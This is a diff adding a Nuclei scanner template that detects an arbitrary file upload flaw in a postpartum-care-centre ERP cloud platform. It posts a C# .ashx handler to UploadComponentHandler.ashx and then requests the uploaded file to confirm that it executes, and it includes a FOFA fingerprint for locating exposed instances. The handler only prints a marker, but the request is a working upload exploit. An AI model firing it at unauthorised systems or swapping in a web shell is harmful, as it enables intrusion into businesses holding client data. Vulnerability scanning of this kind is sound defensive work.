@@ -1,0 +1,84 @@
+id: jintongfang-erp-uploadcomponenthandler-upload
+
+info:
+  name: 月子会所ERP管理云平台 UploadComponentHandler.ashx接口存在文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    月子会所ERP管理云平台 UploadComponentHandler.ashx接口存在文件上传漏洞
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/34bc79651391d2223206102bfa129327d1efc796/wpoc/%E6%9C%88%E5%AD%90%E4%BC%9A%E6%89%80ERP/%E6%9C%88%E5%AD%90%E4%BC%9A%E6%89%80ERP%E7%AE%A1%E7%90%86%E4%BA%91%E5%B9%B3%E5%8F%B0upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa: product="妈妈宝盒-ERP"
+  tags: 月子护理ERP管理平台
+
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Page/upload/UploadComponentHandler.ashx"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="1.ashx"
+
+      <% @ webhandler language="C#" class="AverageHandler" %>
+      using System;
+      using System.Web;
+
+      public class AverageHandler : IHttpHandler
+      {
+      public bool IsReusable {
+      get {
+      return true;
+      }
+      }
+      public void ProcessRequest(HttpContext ctx)
+      {
+      ctx.Response.Write("vulnerability{{t1}}");
+      }
+      }
+      --00content0boundary00--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        words:
+          - "UploadBaseFolder"
+        internal: true
+
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        internal: true
+        regex:
+          - "UploadBaseFolder/ERP(?P<filename>.*?).ashx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/UploadBaseFolder/ERP/{{filename}}.ashx"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "vulnerability{{t1}}"
+        part: body
